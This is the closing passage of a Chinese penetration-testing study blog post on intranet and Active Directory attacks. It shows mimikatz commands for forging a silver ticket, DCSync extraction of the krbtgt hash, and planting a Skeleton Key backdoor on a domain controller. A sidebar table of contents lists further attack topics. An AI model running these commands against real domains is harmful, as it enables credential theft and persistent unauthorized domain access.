<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 域sid</span><br><span class="line">2. 域名</span><br><span class="line">3. 用户名:可以是任意用户名</span><br><span class="line">4. 服务名</span><br><span class="line">5. 目标计算机账户密码hash</span><br><span class="line"></span><br><span class="line">kerberos::golden命令导出白银票据</span><br></pre></td></tr></table></figure>

<p>获取krbtgt凭证</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:School-DM.school.com /domain:school.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<h4 id="Skeleton-key"><a href="#Skeleton-key" class="headerlink" title="Skeleton key"></a>Skeleton key</h4><p>域后门</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br><span class="line"><span class="meta">#</span><span class="bash">万能密码为mimikatz,操作要在域控上完成,且域控重启后失效.(鸡肋)</span></span><br></pre></td></tr></table></figure>


      
    </div>

    

    
    
    

    
<div>
  
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
    
</div>
  
</div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/知识点/" rel="tag"># 知识点</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/12/25/XSS跨站脚本-笔记/" rel="prev" title="XSS跨站脚本-笔记">
                <i class="fa fa-chevron-left"></i> XSS跨站脚本-笔记
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/12/21/Lua程序设计(第4版)-学习笔记/" rel="next" title="Lua程序设计第4版-笔记">
                Lua程序设计第4版-笔记 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <a href="/">
                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
              </a>
            
              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
              <p class="site-description motion-element" itemprop="description">0menc</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">101</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">16</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">17</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#内网渗透-笔记"><span class="nav-number">1.</span> <span class="nav-text">内网渗透-笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#内网概念"><span class="nav-number">1.1.</span> <span class="nav-text">内网概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进行内网渗透的情况"><span class="nav-number">1.2.</span> <span class="nav-text">进行内网渗透的情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网渗透基本流程"><span class="nav-number">1.3.</span> <span class="nav-text">内网渗透基本流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域渗透流程"><span class="nav-number">1.4.</span> <span class="nav-text">域渗透流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件传输方法"><span class="nav-number">1.5.</span> <span class="nav-text">文件传输方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">1.5.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FTP"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">FTP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VBS"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">VBS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#certutil"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">certutil</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">1.5.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wget和wput"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">wget和wput</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">curl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#scp"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">scp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Rsync"><span class="nav-number">1.5.2.5.</span> <span class="nav-text">Rsync</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.5.3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python快速搭建服务器"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">python快速搭建服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防火墙对ftp两种模式的影响-尤其是Windows自带的ftp"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell搭建http"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">powershell搭建http</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows信息收集"><span class="nav-number">1.6.</span> <span class="nav-text">Windows信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#系统信息"><span class="nav-number">1.6.1.</span> <span class="nav-text">系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户及用户组信息"><span class="nav-number">1.6.2.</span> <span class="nav-text">用户及用户组信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#登录信息"><span class="nav-number">1.6.3.</span> <span class="nav-text">登录信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络信息"><span class="nav-number">1.6.4.</span> <span class="nav-text">网络信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#敏感文件"><span class="nav-number">1.6.5.</span> <span class="nav-text">敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS信息收集"><span class="nav-number">1.6.6.</span> <span class="nav-text">IIS信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#凭证收集"><span class="nav-number">1.6.7.</span> <span class="nav-text">凭证收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-Hash"><span class="nav-number">1.6.7.1.</span> <span class="nav-text">Windows Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#离线凭证收集"><span class="nav-number">1.6.7.2.</span> <span class="nav-text">离线凭证收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#reg命令保存注册表键"><span class="nav-number">1.6.7.2.1.</span> <span class="nav-text">reg命令保存注册表键</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用Invoke-NinjaCopy"><span class="nav-number">1.6.7.2.2.</span> <span class="nav-text">使用Invoke-NinjaCopy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#离线提取lsass进程"><span class="nav-number">1.6.7.2.3.</span> <span class="nav-text">离线提取lsass进程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#procdump-exe"><span class="nav-number">1.6.7.2.4.</span> <span class="nav-text">procdump.exe</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在线凭证收集"><span class="nav-number">1.6.7.3.</span> <span class="nav-text">在线凭证收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Mimikatz"><span class="nav-number">1.6.7.3.1.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Powershell版Mimikatz"><span class="nav-number">1.6.7.3.2.</span> <span class="nav-text">Powershell版Mimikatz</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows访问令牌"><span class="nav-number">1.6.8.</span> <span class="nav-text">Windows访问令牌</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#令牌窃取"><span class="nav-number">1.6.8.1.</span> <span class="nav-text">令牌窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mimikatz"><span class="nav-number">1.6.8.1.1.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Invoke-TokenManipulation-ps1"><span class="nav-number">1.6.8.1.2.</span> <span class="nav-text">Invoke-TokenManipulation.ps1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#meterpreter中incognito"><span class="nav-number">1.6.8.1.3.</span> <span class="nav-text">meterpreter中incognito</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux下信息收集"><span class="nav-number">1.7.</span> <span class="nav-text">Linux下信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看系统类型"><span class="nav-number">1.7.1.</span> <span class="nav-text">查看系统类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内核版本"><span class="nav-number">1.7.2.</span> <span class="nav-text">内核版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程与服务"><span class="nav-number">1.7.3.</span> <span class="nav-text">进程与服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装的应用程序"><span class="nav-number">1.7.4.</span> <span class="nav-text">安装的应用程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本信息收集"><span class="nav-number">1.7.5.</span> <span class="nav-text">基本信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计划任务"><span class="nav-number">1.7.6.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络配置"><span class="nav-number">1.7.7.</span> <span class="nav-text">网络配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络通信"><span class="nav-number">1.7.8.</span> <span class="nav-text">网络通信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户信息"><span class="nav-number">1.7.9.</span> <span class="nav-text">用户信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#日志信息"><span class="nav-number">1.7.10.</span> <span class="nav-text">日志信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">1.7.11.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发"><span class="nav-number">1.8.</span> <span class="nav-text">端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#概念"><span class="nav-number">1.8.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发类型"><span class="nav-number">1.8.2.</span> <span class="nav-text">端口转发类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows下跨边界应用"><span class="nav-number">1.8.3.</span> <span class="nav-text">Windows下跨边界应用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Htran"><span class="nav-number">1.8.3.1.</span> <span class="nav-text">Htran</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lcx"><span class="nav-number">1.8.3.2.</span> <span class="nav-text">Lcx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netsh"><span class="nav-number">1.8.3.3.</span> <span class="nav-text">Netsh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fpipe"><span class="nav-number">1.8.3.4.</span> <span class="nav-text">Fpipe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Socks代理"><span class="nav-number">1.8.3.5.</span> <span class="nav-text">Socks代理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#reGeorg"><span class="nav-number">1.8.3.5.1.</span> <span class="nav-text">reGeorg</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssocks"><span class="nav-number">1.8.3.5.2.</span> <span class="nav-text">ssocks</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux下跨边界应用"><span class="nav-number">1.8.4.</span> <span class="nav-text">Linux下跨边界应用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rtcp-py"><span class="nav-number">1.8.4.1.</span> <span class="nav-text">rtcp.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-PUTTY"><span class="nav-number">1.8.4.2.</span> <span class="nav-text">SSH + PUTTY</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#netcat与socat端口转发"><span class="nav-number">1.8.4.3.</span> <span class="nav-text">netcat与socat端口转发</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Earthworm-跨平台内网穿透"><span class="nav-number">1.8.5.</span> <span class="nav-text">Earthworm:跨平台内网穿透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.8.6.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Netcat"><span class="nav-number">1.8.6.1.</span> <span class="nav-text">Netcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bash"><span class="nav-number">1.8.6.2.</span> <span class="nav-text">Bash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python-Perl-Php反弹"><span class="nav-number">1.8.6.3.</span> <span class="nav-text">python/Perl/Php反弹</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码记录与欺骗攻击"><span class="nav-number">1.9.</span> <span class="nav-text">密码记录与欺骗攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#密码记录工具"><span class="nav-number">1.9.1.</span> <span class="nav-text">密码记录工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Winlogonhack"><span class="nav-number">1.9.1.1.</span> <span class="nav-text">Winlogonhack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ntpass"><span class="nav-number">1.9.1.2.</span> <span class="nav-text">Ntpass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Get-Keystrokes-ps1"><span class="nav-number">1.9.1.3.</span> <span class="nav-text">Get-Keystrokes.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Invoke-CredentialsPhish-ps1"><span class="nav-number">1.9.1.4.</span> <span class="nav-text">Invoke-CredentialsPhish.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Openssh后门"><span class="nav-number">1.9.1.5.</span> <span class="nav-text">Openssh后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Openssh-backdoor-kit"><span class="nav-number">1.9.1.6.</span> <span class="nav-text">Openssh-backdoor-kit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux键盘记录sh2log"><span class="nav-number">1.9.1.7.</span> <span class="nav-text">linux键盘记录sh2log</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP与DNS欺骗攻击"><span class="nav-number">1.9.2.</span> <span class="nav-text">ARP与DNS欺骗攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#arp欺骗攻击"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">arp欺骗攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Cain"><span class="nav-number">1.9.2.1.1.</span> <span class="nav-text">Cain</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Abel"><span class="nav-number">1.9.2.1.2.</span> <span class="nav-text">Abel</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS欺骗攻击"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">DNS欺骗攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向移动"><span class="nav-number">1.10.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMB协议利用"><span class="nav-number">1.10.0.1.</span> <span class="nav-text">SMB协议利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MS17-010"><span class="nav-number">1.10.0.1.1.</span> <span class="nav-text">MS17-010</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨平台横向移动-wmi利用"><span class="nav-number">1.10.0.2.</span> <span class="nav-text">跨平台横向移动 [ wmi利用 ]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#计划任务利用"><span class="nav-number">1.10.0.3.</span> <span class="nav-text">计划任务利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ipc"><span class="nav-number">1.10.0.3.1.</span> <span class="nav-text">ipc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#schtasks"><span class="nav-number">1.10.0.3.2.</span> <span class="nav-text">schtasks</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#at"><span class="nav-number">1.10.0.3.3.</span> <span class="nav-text">at</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域内信息收集"><span class="nav-number">1.11.</span> <span class="nav-text">域内信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows认证"><span class="nav-number">1.11.1.</span> <span class="nav-text">Windows认证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM认证过程"><span class="nav-number">1.11.1.1.</span> <span class="nav-text">NTLM认证过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerberos认证过程"><span class="nav-number">1.11.1.2.</span> <span class="nav-text">Kerberos认证过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域用户消息"><span class="nav-number">1.11.2.</span> <span class="nav-text">域用户消息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SRV"><span class="nav-number">1.11.2.1.</span> <span class="nav-text">SRV</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPN"><span class="nav-number">1.11.2.2.</span> <span class="nav-text">SPN</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Setspn-exe"><span class="nav-number">1.11.2.2.1.</span> <span class="nav-text">Setspn.exe</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ADFind-exe"><span class="nav-number">1.11.2.3.</span> <span class="nav-text">ADFind.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PVEFindADUser-exe"><span class="nav-number">1.11.2.4.</span> <span class="nav-text">PVEFindADUser.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NetView-exe"><span class="nav-number">1.11.2.5.</span> <span class="nav-text">NetView.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netsess-exe"><span class="nav-number">1.11.2.6.</span> <span class="nav-text">Netsess.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nltest-exe"><span class="nav-number">1.11.2.7.</span> <span class="nav-text">Nltest.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ADExplorer-exe"><span class="nav-number">1.11.2.8.</span> <span class="nav-text">ADExplorer.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LASPSearch"><span class="nav-number">1.11.2.9.</span> <span class="nav-text">LASPSearch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#离线凭证收集-1"><span class="nav-number">1.11.2.10.</span> <span class="nav-text">离线凭证收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell利用"><span class="nav-number">1.11.2.11.</span> <span class="nav-text">Powershell利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PowerSploit"><span class="nav-number">1.11.2.11.1.</span> <span class="nav-text">PowerSploit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PowerView"><span class="nav-number">1.11.2.11.2.</span> <span class="nav-text">PowerView</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域内横向移动"><span class="nav-number">1.12.</span> <span class="nav-text">域内横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#横向拓展常见漏洞"><span class="nav-number">1.12.1.</span> <span class="nav-text">横向拓展常见漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS14-068"><span class="nav-number">1.12.1.1.</span> <span class="nav-text">MS14-068</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GPP漏洞"><span class="nav-number">1.12.1.2.</span> <span class="nav-text">GPP漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPN票据破解"><span class="nav-number">1.12.1.3.</span> <span class="nav-text">SPN票据破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mimikatz后渗透中应用"><span class="nav-number">1.12.1.4.</span> <span class="nav-text">Mimikatz后渗透中应用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-number">1.12.1.4.1.</span> <span class="nav-text">Pass-The-Hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-The-Ticket"><span class="nav-number">1.12.1.4.2.</span> <span class="nav-text">Pass-The-Ticket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-The-Cache"><span class="nav-number">1.12.1.4.3.</span> <span class="nav-text">Pass-The-Cache</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Golden-Ticket"><span class="nav-number">1.12.1.5.</span> <span class="nav-text">Golden Ticket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Silver-Ticket"><span class="nav-number">1.12.1.6.</span> <span class="nav-text">Silver Ticket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Skeleton-key"><span class="nav-number">1.12.1.7.</span> <span class="nav-text">Skeleton key</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>

  

  
</div>











        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>



  



  










  





  

  

  

  

  
  

  

  

  

  

  


<script type="text/javascript">

    var a_idx = 0;
    jQuery(document).ready(function($) {
        $("body").click(function(e) {
            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
            var $i = $("<span />").text(a[a_idx]);
            a_idx = (a_idx + 1) % a.length;
            var x = e.pageX,
                y = e.pageY;
            $i.css({
                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
                "top": y - 20,
                "left": x,
                "position": "absolute",
                "font-weight": "bold",
                "color": "#ff6651"
            });
            $("body").append($i);
            $i.animate({
                    "top": y - 180,
                    "opacity": 0
                },
                1500,
                function() {
                    $i.remove();
                });
        });
    });
</script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
